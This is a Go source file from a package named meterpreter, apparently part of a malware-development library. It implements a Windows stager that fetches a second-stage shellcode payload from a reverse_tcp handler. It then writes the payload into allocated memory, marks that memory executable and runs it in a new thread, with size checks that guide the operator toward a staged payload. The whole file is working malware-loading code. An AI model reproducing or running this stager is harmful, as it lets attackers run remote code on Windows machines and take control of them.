//go:build windows

package meterpreter

import (
	"fmt"
	"runtime"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// platformSpecificStage handles Windows staging.
func (s *Stager) platformSpecificStage() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("this code should only run on Windows")
	}
	return s.stageWindows()
}

// stageWindows fetches and executes the stage on Windows.
func (s *Stager) stageWindows() error {
	shellcode, err := s.fetchStage()
	if err != nil {
		return fmt.Errorf("failed to fetch stage: %w", err)
	}

	if len(shellcode) > 500*1024 {
		return fmt.Errorf("received payload too large (%d bytes), probably stageless instead of staged. "+
			"Use handler with staged payload (e.g., windows/x64/meterpreter/reverse_tcp, NOT meterpreter_reverse_tcp)", len(shellcode))
	}

	if len(shellcode) < 50 {
		return fmt.Errorf("received payload too small (%d bytes), invalid stage", len(shellcode))
	}

	return executeInMemory(shellcode)
}

// executeInMemory allocates RW memory, copies shellcode, re-protects as
// RX, then executes via CreateThread. The two-step allocation avoids
// mapping memory as simultaneously writable and executable (RWX).
func executeInMemory(shellcode []byte) error {
	size := uintptr(len(shellcode))

	addr, err := windows.VirtualAlloc(
		0,
		size,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("VirtualAlloc failed: %w", err)
	}

	_, _, _ = api.ProcRtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		size,
	)

	var oldProtect uint32
	if err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect failed: %w", err)
	}

	thread, _, err := api.ProcCreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if thread == 0 {
		return fmt.Errorf("CreateThread failed: %w", err)
	}

	windows.WaitForSingleObject(windows.Handle(thread), windows.INFINITE)
	windows.CloseHandle(windows.Handle(thread))

	return nil
}
